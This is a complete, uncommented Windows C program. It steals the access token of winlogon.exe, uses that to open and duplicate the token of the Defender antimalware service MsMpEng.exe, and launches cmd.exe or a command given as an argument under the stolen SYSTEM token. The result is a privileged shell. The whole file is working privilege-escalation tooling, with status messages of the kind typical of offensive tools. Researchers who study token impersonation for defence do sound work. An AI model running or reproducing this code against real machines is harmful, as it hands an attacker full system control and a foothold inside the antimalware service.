#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <tlhelp32.h>

DWORD GetProcessPID(char *name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(snapshot != INVALID_HANDLE_VALUE)
	{
		memset(&pe32, 0, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if(Process32First(snapshot, &pe32))
		{
			do
			{
				if(!strcmpi(name, pe32.szExeFile))
				{
					CloseHandle(snapshot);
					return pe32.th32ProcessID;
				}
			}
			while(Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return 0;
}

int main(int argc, char **argv)
{
	int wargc = 0;
	LPWSTR* wargv = NULL;
	WCHAR* cmdline = NULL;
	WCHAR defaultcmd[] = L"cmd.exe";
	DWORD winlogon_pid = 0;
	HANDLE winlogon_process = NULL;
	DWORD msmpeng_pid = 0;
	HANDLE msmpeng_process = NULL;
	HANDLE winlogon_token = NULL;
	HANDLE token = NULL;
	HANDLE duptoken = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	winlogon_pid = GetProcessPID("winlogon.exe");
	if(!winlogon_pid)
	{
		printf("[-] Can't find Winlogon PID!\n");
		return 1;
	}
	printf("[+] Winlogon PID: %u\n", (unsigned int)winlogon_pid);
	winlogon_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, winlogon_pid);
	if(!winlogon_process)
	{
		printf("[-] Can't open Winlogon process: %u!\n", (unsigned int)GetLastError());
		return 1;
	}
	printf("[+] Winlogon opened: %p\n", winlogon_process);
	if(!OpenProcessToken(winlogon_process, MAXIMUM_ALLOWED, &winlogon_token))
	{
		CloseHandle(winlogon_process);
		printf("[-] Can't open Winlogon process token: %u!\n", (unsigned int)GetLastError());
		return 1;
	}
	CloseHandle(winlogon_process);
	printf("[+] Winlogon token opened: %p\n", winlogon_token);
	token = winlogon_token;
	msmpeng_pid = GetProcessPID("MsMpEng.exe");
	if(msmpeng_pid)
	{
		printf("[+] Found MsMpEng PID: %u\n", (unsigned int)msmpeng_pid);
		if(ImpersonateLoggedOnUser(winlogon_token))
		{
			msmpeng_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, msmpeng_pid);
			if(msmpeng_process)
			{
				printf("[+] MsMpEng opened: %p\n", msmpeng_process);
				if(OpenProcessToken(msmpeng_process, MAXIMUM_ALLOWED, &token))
				{
					printf("[+] MsMpEng token opened: %p\n", token);
				}
				else
				{
					printf("[-] Can't open MsMpEng process token: %u!\n", (unsigned int)GetLastError());
				}
				CloseHandle(msmpeng_process);
			}
			else
			{
				printf("[-] Can't open MsMpEng process: %u!\n", (unsigned int)GetLastError());
			}
			RevertToSelf();
		}
		else
		{
			printf("[-] Can't impersonate process!\n", GetLastError());
		}
	}
	else
	{
		printf("[-] Can't find MsMpEng PID!\n");
	}
	if(!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, 2, 1, &duptoken))
	{
		if(token != winlogon_token)
		{
			CloseHandle(winlogon_token);
		}
		CloseHandle(token);
		printf("[-] Can't duplicate handle: %u!\n", (unsigned int)GetLastError());
		return 1;
	}
	printf("[+] Token duplicated: %p\n", duptoken);
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	wargv = CommandLineToArgvW(GetCommandLineW(), &wargc);
	if(wargc > 1)
	{
		cmdline = wargv[1];
	}
	else
	{
		cmdline = defaultcmd;
	}
	if(!CreateProcessWithTokenW(duptoken, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(duptoken);
		if(token != winlogon_token)
		{
			CloseHandle(winlogon_token);
		}
		CloseHandle(token);
		printf("[-] Can't start program: %u!\n", (unsigned int)GetLastError());
		return 1;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(duptoken);
	if(token != winlogon_token)
	{
		CloseHandle(winlogon_token);
	}
	CloseHandle(token);
	printf("[+] Program started\n");
	return 0;
}
